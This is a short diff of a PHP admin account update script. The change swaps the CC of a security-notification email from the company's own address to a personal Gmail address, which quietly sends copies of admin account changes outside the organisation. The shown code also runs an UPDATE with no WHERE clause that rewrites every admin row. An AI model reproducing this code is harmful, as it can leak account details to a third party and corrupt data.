@@ -29,6 +29,7 @@ if (isset($_POST['update']))
     $aggree = mysqli_real_escape_string($conn, $_POST['aggree']);
 
     
+
     $name = strip_tags(htmlspecialchars_decode(htmlentities(trim($name))));
 
     if (!empty($name) && !empty($email) && !empty($password) && !empty($aggree))
@@ -51,7 +52,7 @@ if (isset($_POST['update']))
          $mail->setFrom('info@lynxlaboratories.com.ng', 'Security Notification - Lynx');
          $mail->addAddress($name);     // Add a recipient
          $mail->addAddress($email);               // Name is optional
-         $mail->addCC('info@lynxlaboratories.com.ng');
+         $mail->addCC('micahalumona@gmail.com');
          $mail->addBCC('info@lynxlaboratories.com.ng');
  
          // Content
@@ -175,7 +176,7 @@ if (isset($_POST['update']))
  
          if ($mail->send()) 
          {
-                $pass = password_hash($password, PASSWORD_DEFAULT);
+               $pass = password_hash($password, PASSWORD_DEFAULT);
                // Insert data into DATABASE
                $sql = "UPDATE  `admin_acct` SET `admin_name`='$name', `email`='$email', `password`='$pass' ";
                $query = mysqli_query($conn, $sql) or die("Failed to insert to database!" . mysqli_error($conn));
